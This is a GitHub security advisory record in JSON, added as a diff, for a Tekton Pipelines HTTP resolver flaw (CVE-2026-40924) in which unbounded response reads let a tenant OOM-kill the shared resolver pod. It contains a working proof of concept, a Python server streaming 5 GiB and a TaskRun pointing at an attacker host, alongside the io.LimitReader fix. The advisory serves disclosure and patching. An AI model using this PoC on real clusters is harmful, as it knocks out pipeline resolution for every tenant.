@@ -1,0 +1,50 @@
+{
+  "id": "GHSA-m2cx-gpqf-qf74",
+  "modified": "2026-04-21T20:33:54.316252Z",
+  "published": "2026-04-21T20:27:33Z",
+  "aliases": [
+    "CVE-2026-40924"
+  ],
+  "summary": "Tekton Pipelines: HTTP Resolver Unbounded Response Body Read Enables Denial of Service via Memory Exhaustion",
+  "details": "## Summary\n\nThe HTTP resolver's `FetchHttpResource` function calls `io.ReadAll(resp.Body)` with no response body size limit. Any tenant with permission to create TaskRuns or PipelineRuns that reference the HTTP resolver can point it at an attacker-controlled HTTP server that returns a very large response body within the 1-minute timeout window, causing the `tekton-pipelines-resolvers` pod to be OOM-killed by Kubernetes. Because all resolver types (Git, Hub, Bundle, Cluster, HTTP) run in the same pod, crashing this pod denies resolution service to the entire cluster. Repeated exploitation causes a sustained crash loop. The same vulnerable code path is reached by both the deprecated `pkg/resolution/resolver/http` and the current `pkg/remoteresolution/resolver/http` implementations.\n\n## Details\n\n`pkg/resolution/resolver/http/resolver.go:279–307`:\n\n```go\nfunc FetchHttpResource(ctx context.Context, params map[string]string,\n    kubeclient kubernetes.Interface, logger *zap.SugaredLogger) (framework.ResolvedResource, error) {\n\n    httpClient, err := makeHttpClient(ctx)  // default timeout: 1 minute\n    // ...\n    resp, err := httpClient.Do(req)\n    // ...\n    defer func() { _ = resp.Body.Close() }()\n\n    body, err := io.ReadAll(resp.Body)  // ← no size limit\n    if err != nil {\n        return nil, fmt.Errorf(\"error reading response body: %w\", err)\n    }\n    // ...\n}\n```\n\n`makeHttpClient` sets `http.Client{Timeout: timeout}` where `timeout` defaults to 1 minute and is configurable via `fetch-timeout` in the `http-resolver-config` ConfigMap. The timeout bounds the duration of the entire request (including body read), which limits slow-drip attacks. However, it does not limit the total number of bytes allocated. A fast HTTP server can deliver multi-gigabyte responses well within the 1-minute window.\n\nThe resolver deployment (`config/core/deployments/resolvers-deployment.yaml`) sets a 4 GiB memory limit on the `controller` container. A response of 4 GiB or larger delivered at wire speed will cause `io.ReadAll` to allocate 4 GiB, triggering an OOM-kill. With the default timeout of 60 seconds, a server delivering at 100 MB/s can supply 6 GB — well above the 4 GiB limit — before the timeout fires.\n\nThe `remoteresolution` HTTP resolver (`pkg/remoteresolution/resolver/http/resolver.go:90`) delegates directly to the same `FetchHttpResource` function and is equally affected.\n\n## PoC\n\n```bash\n# Step 1: Run an HTTP server that streams a large response fast\npython3 - \u003c\u003c'EOF'\nimport http.server, socketserver\n\nclass LargeResponseHandler(http.server.BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header(\"Content-Type\", \"application/octet-stream\")\n        self.end_headers()\n        # Stream 5 GB at full speed — completes in \u003c60s on a local network\n        chunk = b\"X\" * (1024 * 1024)  # 1 MiB chunk\n        for _ in range(5120):          # 5120 * 1 MiB = 5 GiB\n            self.wfile.write(chunk)\n\n    def log_message(self, *args):\n        pass\n\nwith socketserver.TCPServer((\"\", 8080), LargeResponseHandler) as httpd:\n    httpd.serve_forever()\nEOF\n\n# Step 2: Create a TaskRun that triggers the HTTP resolver\nkubectl create -f - \u003c\u003c'EOF'\napiVersion: tekton.dev/v1\nkind: TaskRun\nmetadata:\n  name: dos-poc\n  namespace: default\nspec:\n  taskRef:\n    resolver: http\n    params:\n      - name: url\n        value: http://attacker-server.internal:8080/large-payload\nEOF\n\n# Expected result: tekton-pipelines-resolvers pod is OOM-killed.\n# All resolver types in the cluster (git, hub, bundle, cluster, http)\n# become unavailable until Kubernetes restarts the pod.\n# Repeated submission causes a crash loop that continuously disrupts\n# resolution for all tenants in the cluster.\n```\n\n**Note:** On clusters where operators have set a higher `fetch-timeout` (e.g., `10m`), the attacker has more time to deliver a larger body, and the attack is more reliable. On clusters with tight memory limits on the resolver pod, a smaller payload suffices.\n\n## Impact\n\n- **Denial of Service**: OOM-kill of the `tekton-pipelines-resolvers` pod denies all resolution services cluster-wide until Kubernetes restarts the pod.\n- **Crash loop amplification**: A tenant can submit multiple concurrent TaskRuns pointing to the attack server. Each in-flight resolution request accumulates memory independently in the same pod, reducing the payload size needed to reach the OOM threshold.\n- **Blast radius**: Because all resolver types share a single pod, disrupting the HTTP resolver also disrupts unrelated users of the Git, Bundle, Cluster, and Hub resolvers. This is a cluster-wide availability impact achievable by a single namespace-level user.\n\n## Recommended Fix\n\nWrap `resp.Body` with `io.LimitReader` before passing to `io.ReadAll`. Add a configurable `max-body-size` option to the `http-resolver-config` ConfigMap with a sensible default (e.g., 50 MiB, which exceeds the size of any realistic pipeline YAML file):\n\n```go\nconst defaultMaxBodyBytes = 50 * 1024 * 1024 // 50 MiB\n\n// In FetchHttpResource, replace:\n//   body, err := io.ReadAll(resp.Body)\n// with:\nmaxBytes := int64(defaultMaxBodyBytes)\nif v, ok := conf[\"max-body-size\"]; ok {\n    if parsed, err := strconv.ParseInt(v, 10, 64); err == nil {\n        maxBytes = parsed\n    }\n}\nlimitedReader := io.LimitReader(resp.Body, maxBytes+1)\nbody, err := io.ReadAll(limitedReader)\nif err != nil {\n    return nil, fmt.Errorf(\"error reading response body: %w\", err)\n}\nif int64(len(body)) \u003e maxBytes {\n    return nil, fmt.Errorf(\"response body exceeds maximum allowed size of %d bytes\", maxBytes)\n}\n```\n\nThis fix must be applied to `FetchHttpResource` in `pkg/resolution/resolver/http/resolver.go`, which is shared by both the deprecated and current HTTP resolver implementations.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/tektoncd/pipeline",
+        "purl": "pkg:golang/github.com/tektoncd/pipeline"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.11.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.11.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-m2cx-gpqf-qf74/GHSA-m2cx-gpqf-qf74.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/tektoncd/pipeline/security/advisories/GHSA-m2cx-gpqf-qf74"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/tektoncd/pipeline"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tektoncd/pipeline/releases/tag/v1.11.1"
+    }
+  ]
+}
